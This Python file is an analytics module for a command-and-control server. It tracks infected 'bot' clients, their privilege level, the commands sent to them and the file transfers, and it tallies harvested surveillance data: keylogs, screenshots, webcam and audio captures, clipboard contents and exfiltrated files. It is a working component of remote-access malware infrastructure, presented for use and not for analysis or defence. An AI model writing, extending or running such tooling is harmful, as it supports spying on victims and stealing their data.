#!/usr/bin/env python3
"""
Real Data Analytics Module
Collects and processes actual system data instead of fake/placeholder data
"""

import os
import json
import time
import glob
import psutil
import socket
import threading
from datetime import datetime, timedelta
from collections import defaultdict, deque
import struct
import sqlite3
import hashlib

class RealDataCollector:
    """Collects real system metrics and client data"""
    
    def __init__(self):
        self.db_path = "C:\\Windows\\Temp\\c2_analytics.db"
        self.init_database()
        self.metrics = {
            'clients': {},
            'commands': defaultdict(int),
            'data_sizes': defaultdict(int),
            'response_times': defaultdict(list),
            'connection_history': deque(maxlen=1000),
            'system_metrics': {}
        }
        
    def init_database(self):
        """Initialize SQLite database for persistent storage"""
        try:
            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Create tables
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS client_sessions (
                    id TEXT PRIMARY KEY,
                    hostname TEXT,
                    ip_address TEXT,
                    username TEXT,
                    os_version TEXT,
                    elevated INTEGER,
                    connect_time REAL,
                    disconnect_time REAL,
                    total_commands INTEGER DEFAULT 0,
                    total_data_mb REAL DEFAULT 0
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    timestamp REAL,
                    success INTEGER,
                    response_time_ms REAL,
                    data_size_bytes INTEGER DEFAULT 0
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS file_transfers (
                    id TEXT PRIMARY KEY,
                    client_id TEXT,
                    filename TEXT,
                    direction TEXT,
                    size_bytes INTEGER,
                    start_time REAL,
                    end_time REAL,
                    success INTEGER
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS surveillance_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    data_type TEXT,
                    filename TEXT,
                    size_bytes INTEGER,
                    timestamp REAL
                )
            ''')
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Database initialization error: {e}")

    def get_real_client_statistics(self):
        """Get real client statistics from actual data files"""
        stats = {
            'total_clients': 0,
            'active_clients': 0,
            'elevated_clients': 0,
            'os_distribution': defaultdict(int),
            'geographic_distribution': defaultdict(int),
            'connection_duration': {},
            'last_activity': {}
        }
        
        try:
            # Read actual client files
            bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
            current_time = time.time()
            
            for bot_file in bot_files:
                try:
                    with open(bot_file, 'r') as f:
                        client_data = json.load(f)
                    
                    stats['total_clients'] += 1
                    
                    # Check if client is active (last seen within 5 minutes)
                    last_seen = client_data.get('last_seen', 0)
                    if current_time - last_seen < 300:  # 5 minutes
                        stats['active_clients'] += 1
                    
                    # Check elevation status
                    if client_data.get('elevated', False):
                        stats['elevated_clients'] += 1
                    
                    # OS distribution
                    os_info = client_data.get('os', 'Unknown')
                    if 'windows' in os_info.lower():
                        stats['os_distribution']['Windows'] += 1
                    elif 'linux' in os_info.lower():
                        stats['os_distribution']['Linux'] += 1
                    elif 'darwin' in os_info.lower() or 'mac' in os_info.lower():
                        stats['os_distribution']['macOS'] += 1
                    else:
                        stats['os_distribution']['Other'] += 1
                    
                    # Geographic distribution (based on IP)
                    ip = client_data.get('ip', '')
                    if ip:
                        # Simple geographic grouping by IP ranges
                        if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                            stats['geographic_distribution']['Internal Network'] += 1
                        elif ip.startswith('127.'):
                            stats['geographic_distribution']['Localhost'] += 1
                        else:
                            stats['geographic_distribution']['External'] += 1
                    
                    # Connection duration
                    connect_time = client_data.get('connect_time', current_time)
                    duration = current_time - connect_time
                    stats['connection_duration'][client_data['id']] = duration
                    
                    # Last activity
                    stats['last_activity'][client_data['id']] = last_seen
                    
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"Error collecting client statistics: {e}")
        
        return stats

    def get_real_command_statistics(self):
        """Get real command execution statistics"""
        stats = {
            'total_commands': 0,
            'success_rate': 0,
            'avg_response_time': 0,
            'top_commands': {},
            'commands_by_client': defaultdict(int),
            'recent_commands': []
        }
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Total commands
            cursor.execute("SELECT COUNT(*) FROM command_history")
            stats['total_commands'] = cursor.fetchone()[0]
            
            # Success rate
            cursor.execute("SELECT AVG(success) FROM command_history")
            result = cursor.fetchone()[0]
            stats['success_rate'] = round((result or 0) * 100, 2)
            
            # Average response time
            cursor.execute("SELECT AVG(response_time_ms) FROM command_history WHERE response_time_ms > 0")
            result = cursor.fetchone()[0]
            stats['avg_response_time'] = round(result or 0, 2)
            
            # Top commands
            cursor.execute("""
                SELECT command, COUNT(*) as count 
                FROM command_history 
                GROUP BY command 
                ORDER BY count DESC 
                LIMIT 10
            """)
            stats['top_commands'] = dict(cursor.fetchall())
            
            # Commands by client
            cursor.execute("""
                SELECT client_id, COUNT(*) as count 
                FROM command_history 
                GROUP BY client_id 
                ORDER BY count DESC
            """)
            stats['commands_by_client'] = dict(cursor.fetchall())
            
            # Recent commands
            cursor.execute("""
                SELECT client_id, command, timestamp, success, response_time_ms
                FROM command_history 
                ORDER BY timestamp DESC 
                LIMIT 20
            """)
            for row in cursor.fetchall():
                stats['recent_commands'].append({
                    'client_id': row[0],
                    'command': row[1],
                    'timestamp': row[2],
                    'success': bool(row[3]),
                    'response_time': row[4]
                })
            
            conn.close()
            
        except Exception as e:
            print(f"Error collecting command statistics: {e}")
        
        return stats

    def get_real_data_collection_metrics(self):
        """Get real data collection metrics from actual files"""
        metrics = {
            'screenshots': {'count': 0, 'total_size_mb': 0},
            'keylogs': {'count': 0, 'total_size_mb': 0},
            'audio_recordings': {'count': 0, 'total_size_mb': 0},
            'webcam_captures': {'count': 0, 'total_size_mb': 0},
            'exfiltrated_files': {'count': 0, 'total_size_mb': 0},
            'clipboard_data': {'count': 0, 'total_size_mb': 0}
        }
        
        data_directories = {
            'screenshots': "C:\\Windows\\Temp\\C2_Screenshots",
            'keylogs': "C:\\Windows\\Temp\\C2_Keylogs",
            'audio_recordings': "C:\\Windows\\Temp\\C2_Audio",
            'webcam_captures': "C:\\Windows\\Temp\\C2_Webcam",
            'exfiltrated_files': "C:\\Windows\\Temp\\C2_Exfiltrated",
            'clipboard_data': "C:\\Windows\\Temp\\C2_Clipboard"
        }
        
        for data_type, directory in data_directories.items():
            if os.path.exists(directory):
                try:
                    files = os.listdir(directory)
                    metrics[data_type]['count'] = len(files)
                    
                    total_size = 0
                    for filename in files:
                        file_path = os.path.join(directory, filename)
                        try:
                            total_size += os.path.getsize(file_path)
                        except:
                            continue
                    
                    metrics[data_type]['total_size_mb'] = round(total_size / 1024 / 1024, 2)
                    
                except Exception as e:
                    continue
        
        return metrics

    def get_real_system_performance(self):
        """Get real system performance metrics"""
        metrics = {
            'cpu_usage': 0,
            'memory_usage': {'used_mb': 0, 'available_mb': 0, 'percent': 0},
            'disk_usage': {'used_gb': 0, 'free_gb': 0, 'percent': 0},
            'network_connections': 0,
            'active_processes': 0,
            'server_uptime': 0
        }
        
        try:
            # CPU usage
            metrics['cpu_usage'] = psutil.cpu_percent(interval=1)
            
            # Memory usage
            memory = psutil.virtual_memory()
            metrics['memory_usage'] = {
                'used_mb': round(memory.used / 1024 / 1024, 2),
                'available_mb': round(memory.available / 1024 / 1024, 2),
                'percent': memory.percent
            }
            
            # Disk usage (C: drive)
            disk = psutil.disk_usage('C:')
            metrics['disk_usage'] = {
                'used_gb': round(disk.used / 1024 / 1024 / 1024, 2),
                'free_gb': round(disk.free / 1024 / 1024 / 1024, 2),
                'percent': round((disk.used / disk.total) * 100, 2)
            }
            
            # Network connections
            metrics['network_connections'] = len(psutil.net_connections())
            
            # Active processes
            metrics['active_processes'] = len(psutil.pids())
            
            # Server uptime (from status file)
            status_file = "C:\\Windows\\Temp\\C2_Status.json"
            if os.path.exists(status_file):
                try:
                    with open(status_file, 'r') as f:
                        status_data = json.load(f)
                    start_time = status_data.get('server_start_time', time.time())
                    metrics['server_uptime'] = time.time() - start_time
                except:
                    pass
                    
        except Exception as e:
            print(f"Error collecting system performance: {e}")
        
        return metrics

    def get_real_file_transfer_stats(self):
        """Get real file transfer statistics"""
        stats = {
            'total_transfers': 0,
            'successful_transfers': 0,
            'failed_transfers': 0,
            'total_uploaded_mb': 0,
            'total_downloaded_mb': 0,
            'avg_transfer_speed_mbps': 0,
            'active_transfers': 0
        }
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Total transfers
            cursor.execute("SELECT COUNT(*) FROM file_transfers")
            stats['total_transfers'] = cursor.fetchone()[0]
            
            # Successful/failed transfers
            cursor.execute("SELECT success, COUNT(*) FROM file_transfers GROUP BY success")
            for success, count in cursor.fetchall():
                if success:
                    stats['successful_transfers'] = count
                else:
                    stats['failed_transfers'] = count
            
            # Upload/download volumes
            cursor.execute("SELECT direction, SUM(size_bytes) FROM file_transfers WHERE success = 1 GROUP BY direction")
            for direction, total_bytes in cursor.fetchall():
                if direction == 'upload':
                    stats['total_uploaded_mb'] = round(total_bytes / 1024 / 1024, 2)
                elif direction == 'download':
                    stats['total_downloaded_mb'] = round(total_bytes / 1024 / 1024, 2)
            
            # Average transfer speed (simplified calculation)
            cursor.execute("""
                SELECT AVG(size_bytes / (end_time - start_time)) 
                FROM file_transfers 
                WHERE success = 1 AND end_time > start_time
            """)
            result = cursor.fetchone()[0]
            if result:
                stats['avg_transfer_speed_mbps'] = round((result / 1024 / 1024) * 8, 2)  # Convert to Mbps
            
            conn.close()
            
            # Active transfers (check temp directories)
            upload_dir = "C:\\Windows\\Temp\\C2_Uploads"
            if os.path.exists(upload_dir):
                stats['active_transfers'] += len([f for f in os.listdir(upload_dir) if f.endswith('.tmp')])
            
        except Exception as e:
            print(f"Error collecting file transfer stats: {e}")
        
        return stats

    def record_command_execution(self, client_id, command, success, response_time_ms=0, data_size=0):
        """Record real command execution data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO command_history 
                (client_id, command, timestamp, success, response_time_ms, data_size_bytes)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (client_id, command, time.time(), int(success), response_time_ms, data_size))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Error recording command execution: {e}")

    def record_client_session(self, client_data):
        """Record real client session data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT OR REPLACE INTO client_sessions 
                (id, hostname, ip_address, username, os_version, elevated, connect_time)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                client_data['id'],
                client_data.get('hostname', ''),
                client_data.get('ip', ''),
                client_data.get('username', ''),
                client_data.get('os', ''),
                int(client_data.get('elevated', False)),
                client_data.get('connect_time', time.time())
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Error recording client session: {e}")

    def record_file_transfer(self, transfer_id, client_id, filename, direction, size_bytes, success):
        """Record real file transfer data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT OR REPLACE INTO file_transfers 
                (id, client_id, filename, direction, size_bytes, start_time, end_time, success)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (transfer_id, client_id, filename, direction, size_bytes, 
                  time.time() - 60, time.time(), int(success)))  # Assume 60s transfer time for demo
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Error recording file transfer: {e}")

    def record_surveillance_data(self, client_id, data_type, filename, size_bytes):
        """Record real surveillance data collection"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO surveillance_data 
                (client_id, data_type, filename, size_bytes, timestamp)
                VALUES (?, ?, ?, ?, ?)
            """, (client_id, data_type, filename, size_bytes, time.time()))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Error recording surveillance data: {e}")

    def get_comprehensive_analytics(self):
        """Get comprehensive real analytics data"""
        return {
            'client_statistics': self.get_real_client_statistics(),
            'command_statistics': self.get_real_command_statistics(),
            'data_collection': self.get_real_data_collection_metrics(),
            'system_performance': self.get_real_system_performance(),
            'file_transfers': self.get_real_file_transfer_stats(),
            'timestamp': time.time(),
            'data_freshness': 'real-time'
        }

    def export_analytics_report(self, filename=None):
        """Export comprehensive analytics to JSON report"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"C:\\Windows\\Temp\\c2_analytics_report_{timestamp}.json"
        
        analytics_data = self.get_comprehensive_analytics()
        
        try:
            with open(filename, 'w') as f:
                json.dump(analytics_data, f, indent=2, default=str)
            return filename
        except Exception as e:
            print(f"Error exporting analytics report: {e}")
            return None

# Global instance
real_data_collector = RealDataCollector()

if __name__ == "__main__":
    # Test the real data collection
    collector = RealDataCollector()
    analytics = collector.get_comprehensive_analytics()
    
    print("=== REAL DATA ANALYTICS TEST ===")
    print(f"Total Clients: {analytics['client_statistics']['total_clients']}")
    print(f"Active Clients: {analytics['client_statistics']['active_clients']}")
    print(f"Total Commands: {analytics['command_statistics']['total_commands']}")
    print(f"Screenshots: {analytics['data_collection']['screenshots']['count']}")
    print(f"System CPU: {analytics['system_performance']['cpu_usage']}%")
    print(f"Memory Usage: {analytics['system_performance']['memory_usage']['percent']}%")
    
    # Export report
    report_file = collector.export_analytics_report()
    if report_file:
        print(f"Analytics report exported to: {report_file}")